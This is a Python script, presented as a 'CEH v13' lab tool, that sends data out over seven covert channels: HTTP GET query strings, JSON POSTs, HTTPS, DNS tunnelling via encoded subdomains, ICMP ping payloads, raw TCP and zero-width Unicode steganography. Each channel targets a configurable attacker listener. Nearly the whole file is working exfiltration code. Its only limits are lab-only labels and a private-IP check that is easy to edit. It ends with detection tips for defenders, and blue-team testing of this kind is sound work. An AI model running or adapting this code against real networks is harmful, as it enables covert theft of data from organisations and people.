#!/usr/bin/env python3
# LAB-ONLY: Multi-Channel Data Exfiltration Tester
# CEH v13 Ultimate Offensive Script 08
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
#
# PURPOSE: Tests 7 different exfiltration channels to verify whether network
# security monitoring (IDS/IPS/DLP) can detect covert data transfer.
# Blue teams use this to validate their detection coverage.
import sys
import os
import socket
import struct
import base64
import requests
import subprocess
import json
import time
from datetime import datetime

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════
LAB_ATTACKER_IP = "192.168.100.20"      # YOUR lab listener IP
LAB_ATTACKER_HTTP_PORT = 8080           # HTTP listener port
LAB_ATTACKER_DNS_DOMAIN = "lab.test"    # DNS exfil domain
LAB_TEST_DATA = "CEH_V13_LAB_EXFIL_TEST_DATA_SENSITIVE_CREDENTIALS_HERE"
LAB_CHUNK_SIZE = 30                     # Bytes per DNS label

# ═══════════════════════════════════════════════════════════════════════════════
# EXFILTRATION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class ExfilTester:
    def __init__(self, target_ip, test_data):
        self.target = target_ip
        self.data = test_data
        self.results = []

    def _result(self, channel, success, detail):
        icon = "✅" if success else "❌"
        status = "SENT" if success else "FAILED"
        entry = {"channel": channel, "success": success, "detail": detail,
                 "timestamp": datetime.now().isoformat()}
        self.results.append(entry)
        print(f"  {icon} [{status}] {channel}: {detail}")

    # ─── Channel 1: HTTP GET (query string) ──────────────────────────────────
    def exfil_http_get(self):
        print("\n[1/7] HTTP GET Exfiltration...")
        try:
            encoded = base64.b64encode(self.data.encode()).decode()
            # Split into chunks to simulate realistic exfil
            chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
            for i, chunk in enumerate(chunks):
                url = f"http://{self.target}:{LAB_ATTACKER_HTTP_PORT}/api/log?session={i}&d={chunk}"
                requests.get(url, timeout=3, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
            self._result("HTTP GET", True, f"Sent {len(chunks)} chunks ({len(encoded)} bytes b64) to {self.target}")
        except Exception as e:
            self._result("HTTP GET", False, str(e))

    # ─── Channel 2: HTTP POST (JSON body) ────────────────────────────────────
    def exfil_http_post(self):
        print("\n[2/7] HTTP POST Exfiltration...")
        try:
            payload = {
                "type": "telemetry",
                "timestamp": datetime.now().isoformat(),
                "data": base64.b64encode(self.data.encode()).decode(),
                "checksum": hex(hash(self.data) & 0xFFFFFFFF)
            }
            resp = requests.post(
                f"http://{self.target}:{LAB_ATTACKER_HTTP_PORT}/api/telemetry",
                json=payload, timeout=3,
                headers={"Content-Type": "application/json", "X-Request-ID": "lab-test"}
            )
            self._result("HTTP POST", True, f"Sent JSON payload ({len(json.dumps(payload))} bytes)")
        except Exception as e:
            self._result("HTTP POST", False, str(e))

    # ─── Channel 3: HTTPS (encrypted) ────────────────────────────────────────
    def exfil_https(self):
        print("\n[3/7] HTTPS Exfiltration...")
        try:
            import urllib3
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            encoded = base64.b64encode(self.data.encode()).decode()
            resp = requests.post(
                f"https://{self.target}:{LAB_ATTACKER_HTTP_PORT}/secure/upload",
                data=encoded, timeout=3, verify=False,
                headers={"Content-Type": "application/octet-stream"}
            )
            self._result("HTTPS", True, f"Sent {len(encoded)} bytes over TLS")
        except Exception as e:
            self._result("HTTPS", False, str(e))

    # ─── Channel 4: DNS Tunneling ────────────────────────────────────────────
    def exfil_dns(self):
        print("\n[4/7] DNS Tunneling Exfiltration...")
        try:
            # Encode data as hex and split into DNS-safe labels (max 63 chars each)
            hex_data = self.data.encode().hex()
            labels = [hex_data[i:i+LAB_CHUNK_SIZE*2] for i in range(0, len(hex_data), LAB_CHUNK_SIZE*2)]

            for i, label in enumerate(labels):
                # Construct DNS query: <chunk_index>.<hex_data>.<domain>
                query = f"{i}.{label}.{LAB_ATTACKER_DNS_DOMAIN}"
                try:
                    # Perform DNS lookup (the attacker's DNS server captures the query)
                    socket.getaddrinfo(query, None, socket.AF_INET, socket.SOCK_STREAM)
                except socket.gaierror:
                    pass  # Expected — the domain doesn't resolve, but the query was sent

            self._result("DNS Tunnel", True,
                         f"Sent {len(labels)} DNS queries encoding {len(self.data)} bytes "
                         f"as {len(labels)} labels to *.{LAB_ATTACKER_DNS_DOMAIN}")
        except Exception as e:
            self._result("DNS Tunnel", False, str(e))

    # ─── Channel 5: ICMP (ping) ──────────────────────────────────────────────
    def exfil_icmp(self):
        print("\n[5/7] ICMP Exfiltration...")
        try:
            # Encode data into ICMP payload using ping
            encoded = base64.b64encode(self.data.encode()).decode()
            chunks = [encoded[i:i+32] for i in range(0, len(encoded), 32)]

            for chunk in chunks:
                if sys.platform == "win32":
                    # Windows: -l sets payload size, -p sets pattern (limited)
                    cmd = ["ping", "-n", "1", "-l", str(len(chunk)), self.target]
                else:
                    # Linux: -p sets hex pattern in ICMP payload
                    hex_chunk = chunk.encode().hex()[:32]  # ping -p max 16 bytes
                    cmd = ["ping", "-c", "1", "-p", hex_chunk, self.target]

                subprocess.run(cmd, capture_output=True, timeout=5)

            self._result("ICMP", True,
                         f"Sent {len(chunks)} ICMP packets to {self.target} "
                         f"(data embedded in payload)")
        except subprocess.TimeoutExpired:
            self._result("ICMP", False, "Ping timed out — host unreachable or ICMP blocked")
        except Exception as e:
            self._result("ICMP", False, str(e))

    # ─── Channel 6: Raw TCP socket ───────────────────────────────────────────
    def exfil_tcp_raw(self):
        print("\n[6/7] Raw TCP Exfiltration...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, LAB_ATTACKER_HTTP_PORT))

            # Send data with custom header
            header = struct.pack("!I", len(self.data))  # 4-byte length prefix
            sock.sendall(header + self.data.encode())
            sock.close()

            self._result("Raw TCP", True,
                         f"Sent {len(self.data)} bytes via raw TCP to {self.target}:{LAB_ATTACKER_HTTP_PORT}")
        except Exception as e:
            self._result("Raw TCP", False, str(e))

    # ─── Channel 7: Steganography (file-based) ──────────────────────────────
    def exfil_stego(self):
        print("\n[7/7] Steganography Exfiltration (file-based)...")
        try:
            # Create a minimal PNG with data hidden in metadata
            # PNG header + IHDR chunk + tEXt chunk (metadata) + IEND
            encoded = base64.b64encode(self.data.encode()).decode()

            # Simple approach: embed in a text file disguised with normal content
            cover_text = "Meeting notes from Q3 review - revenue targets discussed.\n" * 10
            # Append hidden data using zero-width characters (Unicode steganography)
            hidden = ""
            for byte in encoded.encode():
                # Encode each bit as zero-width space (0) or zero-width non-joiner (1)
                for bit in range(8):
                    if (byte >> (7 - bit)) & 1:
                        hidden += "\u200c"  # Zero-width non-joiner = 1
                    else:
                        hidden += "\u200b"  # Zero-width space = 0

            stego_file = "meeting_notes_q3.txt"
            with open(stego_file, "w", encoding="utf-8") as f:
                f.write(cover_text + hidden)

            file_size = os.path.getsize(stego_file)
            self._result("Steganography", True,
                         f"Created '{stego_file}' ({file_size} bytes) with {len(encoded)} bytes "
                         f"hidden using zero-width Unicode characters")
            # Cleanup
            os.remove(stego_file)
        except Exception as e:
            self._result("Steganography", False, str(e))

    # ─── Run all channels ────────────────────────────────────────────────────
    def run(self):
        print("=" * 80)
        print("  📤 MULTI-CHANNEL DATA EXFILTRATION TESTER")
        print("  LAB-ONLY — CEH v13 Ultimate Offensive Script 08")
        print("=" * 80)
        print(f"  Target:    {self.target}")
        print(f"  Data size: {len(self.data)} bytes")
        print(f"  Data hash: {hex(hash(self.data) & 0xFFFFFFFF)}")
        print("=" * 80)

        self.exfil_http_get()
        self.exfil_http_post()
        self.exfil_https()
        self.exfil_dns()
        self.exfil_icmp()
        self.exfil_tcp_raw()
        self.exfil_stego()

        # Summary
        print(f"\n{'=' * 80}")
        print(f"  📊 RESULTS")
        print(f"{'=' * 80}")
        success = sum(1 for r in self.results if r["success"])
        failed = sum(1 for r in self.results if not r["success"])
        print(f"  Channels tested: {len(self.results)}")
        print(f"  Successful:      {success}")
        print(f"  Failed:          {failed}")

        print(f"\n  🛡️  DETECTION GUIDANCE:")
        for r in self.results:
            if r["success"]:
                channel = r["channel"]
                if "HTTP" in channel:
                    print(f"    → {channel}: Monitor proxy logs for unusual base64 payloads and endpoints")
                elif "DNS" in channel:
                    print(f"    → {channel}: Alert on high-entropy DNS queries and unusual TXT/A record volumes")
                elif "ICMP" in channel:
                    print(f"    → {channel}: Inspect ICMP payload sizes >64 bytes, alert on data-bearing pings")
                elif "TCP" in channel:
                    print(f"    → {channel}: Monitor non-HTTP traffic on HTTP ports via DPI")
                elif "Stego" in channel:
                    print(f"    → {channel}: Scan outbound files for zero-width Unicode characters")


if __name__ == "__main__":
    # Lab IP validation
    if not LAB_ATTACKER_IP.startswith(("10.", "172.16.", "172.17.", "172.18.", "172.19.",
            "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.",
            "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.")):
        print("ERROR: LAB-ONLY! Use private lab IPs!")
        sys.exit(1)

    import urllib3
    urllib3.disable_warnings()
    tester = ExfilTester(LAB_ATTACKER_IP, LAB_TEST_DATA)
    tester.run()
